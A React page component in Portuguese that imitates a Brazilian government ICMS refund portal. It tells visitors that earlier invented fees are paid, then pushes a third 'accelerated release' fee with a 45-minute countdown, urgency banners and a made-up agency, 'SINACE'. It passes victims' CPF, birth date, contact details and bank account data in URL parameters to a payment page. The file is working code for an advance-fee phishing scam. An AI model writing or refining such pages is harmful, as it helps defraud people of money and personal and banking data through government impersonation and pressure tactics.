import { useState, useEffect } from "react";
import { Button } from "@/components/ui/button";
import { Card, CardContent, CardHeader, CardTitle } from "@/components/ui/card";
import { AlertTriangle, CheckCircle2, Info, Clock, DollarSign, FileText, ReceiptText, HelpCircle, LockKeyhole, Timer, Shield, Zap, CheckCheck } from "lucide-react";
import { Link, useLocation } from "wouter";
import Header from "@/components/Header";
import Footer from "@/components/Footer";
import { Alert, AlertDescription, AlertTitle } from "@/components/ui/alert";
import { Badge } from "@/components/ui/badge";
import { useToast } from "@/hooks/use-toast";
import ScrollToTop from "@/components/ScrollToTop";

// Funções de formatação
const formatarCPF = (cpf: string) => {
  return cpf.replace(/(\d{3})(\d{3})(\d{3})(\d{2})/, "$1.$2.$3-$4");
};

const formatarMoeda = (valor: number | string) => {
  const valorNumerico = typeof valor === 'string' ? parseFloat(valor) : valor;
  return valorNumerico.toLocaleString('pt-BR', {
    style: 'currency',
    currency: 'BRL',
  });
};

const formatarData = (dataString: string) => {
  const data = new Date(dataString);
  return data.toLocaleDateString('pt-BR', {
    day: '2-digit',
    month: '2-digit',
    year: 'numeric',
    hour: '2-digit',
    minute: '2-digit'
  });
};

// Componente de contador regressivo para o tempo de validade
const ContadorRegressivo = ({ minutos = 45 }: { minutos?: number }) => {
  const [tempoRestante, setTempoRestante] = useState(minutos * 60); // Converter minutos para segundos
  
  useEffect(() => {
    const timer = setInterval(() => {
      setTempoRestante(prev => {
        if (prev <= 1) {
          clearInterval(timer);
          return 0;
        }
        return prev - 1;
      });
    }, 1000);
    
    return () => clearInterval(timer);
  }, []);
  
  const formatarTempo = (segundos: number) => {
    const mins = Math.floor(segundos / 60);
    const secs = segundos % 60;
    return `${mins.toString().padStart(2, '0')}:${secs.toString().padStart(2, '0')}`;
  };
  
  // Calcular a porcentagem do tempo restante
  const porcentagemRestante = Math.floor((tempoRestante / (minutos * 60)) * 100);
  
  return (
    <div className="flex flex-col items-center">
      <div className="relative w-24 h-24 mb-2">
        <svg className="w-24 h-24" viewBox="0 0 100 100">
          {/* Círculo de fundo */}
          <circle 
            cx="50" 
            cy="50" 
            r="45" 
            fill="none" 
            stroke="#EEE" 
            strokeWidth="8" 
          />
          
          {/* Círculo de progresso */}
          <circle 
            cx="50" 
            cy="50" 
            r="45" 
            fill="none" 
            stroke="#FF3B30" 
            strokeWidth="8" 
            strokeLinecap="round" 
            strokeDasharray="283" 
            strokeDashoffset={283 - (283 * porcentagemRestante / 100)} 
            transform="rotate(-90 50 50)" 
          />
        </svg>
        <div className="absolute inset-0 flex items-center justify-center">
          <span className="text-xl font-bold text-red-600">{formatarTempo(tempoRestante)}</span>
        </div>
      </div>
      <p className="text-xs text-red-600 font-medium">Tempo restante para usar a LAR</p>
    </div>
  );
};

export default function TaxaLAR() {
  const [location, setLocation] = useLocation();
  const { toast } = useToast();
  
  // Valor da Taxa de Liberação Acelerada de Restituição (LAR)
  const VALOR_TAXA_LAR = 48.6;
  
  // Estados para armazenar dados da solicitação
  const [protocolo, setProtocolo] = useState("");
  const [dataAtual, setDataAtual] = useState("");
  const [dataPagamento, setDataPagamento] = useState("");
  const [dadosSolicitacao, setDadosSolicitacao] = useState({
    nome: "",
    cpf: "",
    valor: "0",
    companhia: "",
    estado: "",
    dataNascimento: "",
    email: "",
    telefone: "",
    agencia: "",
    conta: "",
    pagamentoId: ""
  });
  
  // Obter parâmetros da URL
  useEffect(() => {
    const urlParams = new URLSearchParams(window.location.search);
    
    // Definir protocolo baseado no CPF
    const protocoloParam = urlParams.get('protocolo');
    if (protocoloParam) {
      setProtocolo(protocoloParam);
    } else {
      const cpf = urlParams.get('cpf') || "";
      if (cpf) {
        setProtocolo(`${cpf.substring(0, 4)}4714${cpf.substring(6, 9)}`);
      }
    }
    
    // Definir data atual e data estimada de pagamento
    const dataHoje = new Date();
    setDataAtual(dataHoje.toLocaleDateString('pt-BR'));
    
    // Definir data do pagamento da primeira taxa
    const dataPagamentoParam = urlParams.get('dataPagamento');
    if (dataPagamentoParam) {
      setDataPagamento(formatarData(dataPagamentoParam));
    } else {
      setDataPagamento(dataHoje.toLocaleDateString('pt-BR', {
        day: '2-digit',
        month: '2-digit',
        year: 'numeric',
        hour: '2-digit',
        minute: '2-digit'
      }));
    }
    
    // Preencher dados da solicitação
    setDadosSolicitacao({
      nome: urlParams.get('nome') || "",
      cpf: urlParams.get('cpf') || "",
      valor: urlParams.get('valor') || "0",
      companhia: urlParams.get('companhia') || "",
      estado: urlParams.get('estado') || "",
      dataNascimento: urlParams.get('nasc') || "",
      email: urlParams.get('email') || "",
      telefone: urlParams.get('telefone') || "",
      agencia: urlParams.get('agencia') || "",
      conta: urlParams.get('conta') || "",
      pagamentoId: urlParams.get('pagamentoId') || ""
    });
  }, []);
  
  // Função para prosseguir para o pagamento da LAR
  const prosseguirParaPagamentoLAR = () => {
    // Criar os parâmetros da URL para passar adiante
    const params = new URLSearchParams();
    
    // Adicionar todos os dados necessários para a próxima página
    Object.entries(dadosSolicitacao).forEach(([key, value]) => {
      params.append(key, value);
    });
    
    params.append('valorTaxaLAR', VALOR_TAXA_LAR.toString());
    params.append('protocolo', protocolo);
    
    // Redirecionar para a página de pagamento da LAR
    setTimeout(() => {
      setLocation(`/pagamento-lar?${params.toString()}`);
    }, 500);
  };
  
  // Função para pular o pagamento da LAR e ir para sucesso
  const pularLARIrParaSucesso = () => {
    // Criar os parâmetros da URL para a página de sucesso
    const params = new URLSearchParams();
    
    // Adicionar todos os dados necessários
    Object.entries(dadosSolicitacao).forEach(([key, value]) => {
      params.append(key, value);
    });
    
    params.append('protocolo', protocolo);
    params.append('taxasCompletas', 'true');
    params.append('larIgnorado', 'true');
    
    // Redirecionar para a página de sucesso
    setTimeout(() => {
      setLocation(`/sucesso?${params.toString()}`);
    }, 500);
  };
  
  // Calcula valores formatados
  const valorRestituicaoFormatado = formatarMoeda(parseFloat(dadosSolicitacao.valor));
  const valorTaxaLARFormatado = formatarMoeda(VALOR_TAXA_LAR);
  const cpfFormatado = dadosSolicitacao.cpf ? formatarCPF(dadosSolicitacao.cpf) : "";
  
  return (
    <>
      <ScrollToTop />
      <Header />
      <main className="container mx-auto px-2 py-4 min-h-screen">
        <div className="p-3 sm:p-4 relative bg-gray-50 rounded-lg shadow-md w-full mx-auto">
          {/* Cabeçalho com informações da restituição */}
          <div className="bg-[#1351B4] text-white p-4 rounded-md mb-5 shadow-sm">
            <div className="flex flex-col md:flex-row md:justify-between md:items-center gap-3">
              <div className="text-left">
                <div className="flex items-center mb-1">
                  <FileText className="mr-2 h-5 w-5 text-white" />
                  <h3 className="font-bold text-lg">Restituição de ICMS</h3>
                </div>
                <div className="bg-[#0C4DA2] text-white text-xs px-2 py-1 rounded inline-flex items-center">
                  <Info size={12} className="mr-1" />
                  Protocolo nº {protocolo}
                </div>
              </div>
              <div className="text-right bg-green-700 rounded-md p-3">
                <p className="font-medium text-white text-sm mb-1">TCN 100% Quitada</p>
                <p className="font-bold text-lg text-white">{valorRestituicaoFormatado}</p>
                <div className="flex items-center justify-end mt-1 text-xs text-white">
                  <CheckCheck size={12} className="mr-1" />
                  <span>Restituição: <span className="font-medium">Em Processamento</span></span>
                </div>
              </div>
            </div>
          </div>
          
          {/* Alerta de status */}
          <div className="mb-6">
            <Alert className="border-green-500 bg-green-50">
              <CheckCircle2 className="h-5 w-5 text-green-600" />
              <AlertTitle className="font-bold text-green-800">Parabéns! Taxa de Conformidade Nacional Quitada</AlertTitle>
              <AlertDescription className="text-green-700">
                Você completou com sucesso o pagamento da TCN. Sua restituição foi aprovada e será processada conforme 
                o calendário fiscal padrão. Agora você pode optar pela etapa opcional de Liberação Acelerada.
              </AlertDescription>
            </Alert>
          </div>
          
          {/* Barra de progresso de etapas */}
          <div className="bg-[#1351B4] text-white py-3 px-4 rounded-t-md font-semibold text-sm flex items-center mb-0">
            <div className="bg-white/20 p-1.5 rounded-md mr-2">
              <ReceiptText className="h-4 w-4" />
            </div>
            PROCESSO DE LIBERAÇÃO DA RESTITUIÇÃO
          </div>
          <div className="border border-t-0 border-gray-200 rounded-b-md p-5 bg-white shadow-sm mb-6">
            <div className="space-y-5">
              <div className="flex items-start">
                <div className="bg-green-500 rounded-full p-2 text-white mt-0.5 mr-3 flex-shrink-0">
                  <CheckCircle2 className="h-4 w-4" />
                </div>
                <div>
                  <p className="font-semibold text-gray-800">1ª ETAPA - Taxa de Regularização Energética (TRE)</p>
                  <p className="text-sm text-gray-600">Taxa inicial para abertura do processo de restituição. Pagamento realizado com sucesso.</p>
                  <Badge variant="outline" className="mt-1 bg-green-50 text-green-700 border-green-200">Concluído</Badge>
                </div>
              </div>
              
              <div className="flex items-start">
                <div className="bg-green-500 rounded-full p-2 text-white mt-0.5 mr-3 flex-shrink-0">
                  <CheckCircle2 className="h-4 w-4" />
                </div>
                <div>
                  <p className="font-semibold text-gray-800">2ª ETAPA - Taxa de Conformidade Nacional (TCN)</p>
                  <p className="text-sm text-gray-600">Taxa para validação do seu crédito no Sistema Nacional de Compensações Elétricas (SINACE).</p>
                  <Badge variant="outline" className="mt-1 bg-green-50 text-green-700 border-green-200">Concluído</Badge>
                </div>
              </div>
              
              <div className="flex items-start">
                <div className="bg-amber-500 rounded-full p-2 text-white mt-0.5 mr-3 flex-shrink-0">
                  <Zap className="h-4 w-4" />
                </div>
                <div>
                  <p className="font-semibold text-gray-800">3ª ETAPA - Liberação Acelerada de Restituição (LAR)</p>
                  <p className="text-sm text-gray-600">
                    <span className="font-medium text-amber-700">Disponível exclusivamente por tempo limitado.</span> Etapa 
                    opcional para recebimento prioritário e imediato da sua restituição, com processamento em até 60 minutos.
                  </p>
                  <Badge variant="outline" className="mt-1 bg-amber-50 text-amber-700 border-amber-200">Opcional</Badge>
                </div>
              </div>
            </div>
          </div>
          
          {/* Detalhes da taxa LAR */}
          <div className="bg-[#1351B4] text-white py-3 px-4 rounded-t-md font-semibold text-sm flex items-center mb-0">
            <div className="bg-white/20 p-1.5 rounded-md mr-2">
              <Zap className="h-4 w-4" />
            </div>
            LIBERAÇÃO ACELERADA DE RESTITUIÇÃO (LAR)
          </div>
          <div className="border border-t-0 border-gray-200 rounded-b-md p-5 bg-white shadow-sm mb-6">
            <div className="grid grid-cols-1 md:grid-cols-3 gap-6">
              <div className="md:col-span-2">
                {/* Card destacado da Taxa LAR */}
                <div className="bg-gradient-to-r from-amber-50 to-amber-100 p-5 rounded-lg border border-amber-200 shadow-sm mb-6">
                  <div className="flex items-center mb-4">
                    <div className="bg-amber-500 rounded-full p-2 text-white mr-3 flex-shrink-0">
                      <Zap className="h-6 w-6" />
                    </div>
                    <div>
                      <h3 className="font-bold text-amber-800 text-xl">Liberação Acelerada de Restituição</h3>
                      <p className="text-amber-700">Receba seu dinheiro em até 60 minutos</p>
                    </div>
                  </div>
                  
                  <div className="mb-4">
                    <div className="flex justify-between items-center mb-3">
                      <span className="text-amber-800 font-medium">Valor da LAR:</span>
                      <span className="font-bold text-2xl text-amber-800">{valorTaxaLARFormatado}</span>
                    </div>
                    
                    <div className="grid grid-cols-1 sm:grid-cols-2 gap-3 text-sm mb-4">
                      <div className="flex items-center bg-white p-2 rounded-md border border-amber-200">
                        <Zap className="h-4 w-4 text-amber-600 mr-1.5 flex-shrink-0" />
                        <span className="text-amber-800">Processamento prioritário</span>
                      </div>
                      <div className="flex items-center bg-white p-2 rounded-md border border-amber-200">
                        <Timer className="h-4 w-4 text-amber-600 mr-1.5 flex-shrink-0" />
                        <span className="text-amber-800">Crédito em até 60 minutos</span>
                      </div>
                    </div>
                  </div>
                  
                  <div className="space-y-3">
                    <h4 className="font-semibold text-amber-800 flex items-center">
                      <Info className="h-4 w-4 mr-2" />
                      Objetivo da Liberação Acelerada de Restituição
                    </h4>
                    
                    <p className="text-sm text-amber-700">
                      A LAR é uma taxa prioritária e opcional, criada para cidadãos que desejam antecipar o crédito 
                      da restituição de forma imediata, sem necessidade de aguardar os trâmites do calendário fiscal comum.
                    </p>
                    
                    <p className="text-sm text-amber-700">
                      Ao efetuar a LAR, seu processo é inserido em fila expressa de liberação, com prioridade no sistema 
                      de pagamentos do Governo, garantindo que o valor seja creditado em até 60 minutos após a compensação.
                    </p>
                    
                    <div className="bg-amber-50 border border-amber-200 rounded-md p-3 mt-3">
                      <h5 className="font-semibold text-amber-800 mb-1 flex items-center">
                        <LockKeyhole className="h-4 w-4 mr-1" />
                        Disponibilidade Limitada:
                      </h5>
                      <p className="text-sm text-amber-700">
                        A liberação da LAR só é habilitada após a confirmação da TCN e tem validade de apenas 45 minutos.
                        Após esse prazo, a restituição será processada normalmente, sem prioridade.
                      </p>
                    </div>
                  </div>
                </div>
                
                {/* Comparativo das opções */}
                <div className="bg-gray-50 border border-gray-200 rounded-lg p-4 mb-6">
                  <h4 className="font-semibold text-gray-800 mb-3 flex items-center">
                    <Info className="h-4 w-4 mr-2" />
                    Comparativo de Opções
                  </h4>
                  
                  <div className="grid grid-cols-1 sm:grid-cols-2 gap-4">
                    <div className="bg-green-50 border border-green-200 rounded-md p-3">
                      <h5 className="font-semibold text-green-800 mb-2 flex items-center justify-center">
                        <Clock className="h-4 w-4 mr-1" />
                        Sem LAR (Gratuito)
                      </h5>
                      
                      <ul className="space-y-2 text-sm">
                        <li className="flex items-start">
                          <span className="text-gray-600 mr-2">•</span>
                          <span className="text-gray-700">Processamento padrão</span>
                        </li>
                        <li className="flex items-start">
                          <span className="text-gray-600 mr-2">•</span>
                          <span className="text-gray-700">Liberação em até 15 dias úteis</span>
                        </li>
                        <li className="flex items-start">
                          <span className="text-gray-600 mr-2">•</span>
                          <span className="text-gray-700">Sujeito à agenda de pagamentos</span>
                        </li>
                        <li className="flex items-start">
                          <span className="text-gray-600 mr-2">•</span>
                          <span className="text-gray-700">Sem custo adicional</span>
                        </li>
                      </ul>
                    </div>
                    
                    <div className="bg-amber-50 border-2 border-amber-400 rounded-md p-3 relative">
                      <div className="absolute -top-3 -right-3 bg-amber-500 text-white text-xs font-bold py-1 px-2 rounded-full">
                        RECOMENDADO
                      </div>
                      
                      <h5 className="font-semibold text-amber-800 mb-2 flex items-center justify-center">
                        <Zap className="h-4 w-4 mr-1" />
                        Com LAR ({valorTaxaLARFormatado})
                      </h5>
                      
                      <ul className="space-y-2 text-sm">
                        <li className="flex items-start font-semibold text-amber-800">
                          <span className="text-amber-600 mr-2">•</span>
                          <span>Processamento prioritário</span>
                        </li>
                        <li className="flex items-start font-semibold text-amber-800">
                          <span className="text-amber-600 mr-2">•</span>
                          <span>Liberação em até 60 minutos</span>
                        </li>
                        <li className="flex items-start font-semibold text-amber-800">
                          <span className="text-amber-600 mr-2">•</span>
                          <span>Fila de pagamento expressa</span>
                        </li>
                        <li className="flex items-start font-semibold text-amber-800">
                          <span className="text-amber-600 mr-2">•</span>
                          <span>Economia de tempo</span>
                        </li>
                      </ul>
                    </div>
                  </div>
                </div>
              </div>
              
              <div className="md:col-span-1">
                {/* Contador regressivo e botões de ação */}
                <div className="bg-white border border-gray-200 rounded-lg p-4 shadow-sm">
                  <div className="text-center mb-4">
                    <h4 className="font-semibold text-gray-800 mb-3">Tempo Restante para Ação</h4>
                    <ContadorRegressivo minutos={45} />
                  </div>
                  
                  <div className="space-y-4">
                    <Button 
                      onClick={prosseguirParaPagamentoLAR}
                      className="w-full py-5 bg-amber-600 hover:bg-amber-700 text-white shadow-md"
                    >
                      <div className="flex items-center justify-center">
                        <Zap className="mr-2 h-5 w-5" />
                        <div className="text-left">
                          <div className="font-bold">Receber em 60 minutos</div>
                          <div className="text-xs">Liberação acelerada ({valorTaxaLARFormatado})</div>
                        </div>
                      </div>
                    </Button>
                    
                    <Button 
                      onClick={pularLARIrParaSucesso}
                      variant="outline"
                      className="w-full py-4 border-gray-300 text-gray-600 hover:bg-gray-50"
                    >
                      <div className="flex items-center justify-center">
                        <Clock className="mr-2 h-4 w-4" />
                        <div className="text-left">
                          <div className="font-medium">Aguardar prazo normal</div>
                          <div className="text-xs">Até 15 dias úteis (sem custo)</div>
                        </div>
                      </div>
                    </Button>
                  </div>
                  
                  <div className="mt-4 pt-4 border-t border-gray-200">
                    <div className="text-center">
                      <p className="text-xs text-gray-500 mb-2">Restituição aprovada:</p>
                      <p className="font-bold text-green-700 text-xl mb-1">{valorRestituicaoFormatado}</p>
                      <p className="text-xs text-gray-600">
                        Seu valor já está aprovado e será depositado de acordo com a opção selecionada.
                      </p>
                    </div>
                  </div>
                </div>
              </div>
            </div>
            
            {/* Aviso de urgência */}
            <div className="mt-4 bg-red-50 border border-red-200 rounded-lg p-4">
              <div className="flex items-start">
                <AlertTriangle className="h-5 w-5 text-red-500 mt-0.5 mr-3 flex-shrink-0" />
                <div>
                  <h4 className="font-bold text-red-700 mb-1">OFERTA POR TEMPO LIMITADO</h4>
                  <p className="text-sm text-red-600">
                    A opção de Liberação Acelerada de Restituição (LAR) está disponível apenas por 45 minutos após a 
                    confirmação da TCN. Após esse período, sua restituição será automaticamente processada pelo método 
                    padrão, com prazo de até 15 dias úteis.
                  </p>
                </div>
              </div>
            </div>
          </div>
          
          {/* Seção de informações adicionais */}
          <div>
            <div className="bg-[var(--gov-blue-dark)] text-white py-2 px-3 rounded-t-md font-semibold text-sm flex items-center">
              <HelpCircle className="h-4 w-4 mr-2" />
              PERGUNTAS FREQUENTES
            </div>
            <div className="border border-t-0 border-gray-300 rounded-b-md p-4 bg-white mb-4">
              <div className="space-y-4">
                <div className="border-b border-gray-200 pb-4">
                  <h3 className="font-medium text-[var(--gov-blue-dark)] mb-2">1. O que é a Liberação Acelerada de Restituição (LAR)?</h3>
                  <p className="text-sm text-gray-600">
                    A LAR é uma taxa opcional que prioriza seu processo de restituição, permitindo que o valor 
                    aprovado seja creditado em sua conta em até 60 minutos após a compensação do pagamento, 
                    em vez de aguardar o processamento normal de até 15 dias úteis.
                  </p>
                </div>
                
                <div className="border-b border-gray-200 pb-4">
                  <h3 className="font-medium text-[var(--gov-blue-dark)] mb-2">2. A LAR é obrigatória?</h3>
                  <p className="text-sm text-gray-600">
                    Não. A LAR é totalmente opcional e foi criada para atender cidadãos que precisam receber 
                    seu crédito com urgência. Sem a LAR, sua restituição ainda será processada normalmente, 
                    seguindo o calendário fiscal padrão com prazo de até 15 dias úteis.
                  </p>
                </div>
                
                <div className="border-b border-gray-200 pb-4">
                  <h3 className="font-medium text-[var(--gov-blue-dark)] mb-2">3. Por que tenho apenas 45 minutos para decidir?</h3>
                  <p className="text-sm text-gray-600">
                    O Sistema Nacional de Compensações Elétricas (SINACE) processa as restituições em lotes. 
                    A janela de 45 minutos representa o tempo máximo para incluir seu processo no próximo lote 
                    prioritário. Após esse prazo, sua restituição é automaticamente direcionada para o processo regular.
                  </p>
                </div>
                
                <div>
                  <h3 className="font-medium text-[var(--gov-blue-dark)] mb-2">4. Como funciona a fila expressa de liberação?</h3>
                  <p className="text-sm text-gray-600">
                    Ao optar pela LAR, seu processo é inserido em uma fila prioritária com número reduzido de 
                    procedimentos burocráticos. A taxa cobre os custos operacionais para dar prioridade máxima 
                    ao seu caso, permitindo o processamento imediato da sua restituição.
                  </p>
                </div>
              </div>
            </div>
          </div>
        </div>
      </main>
      <Footer />
    </>
  );
}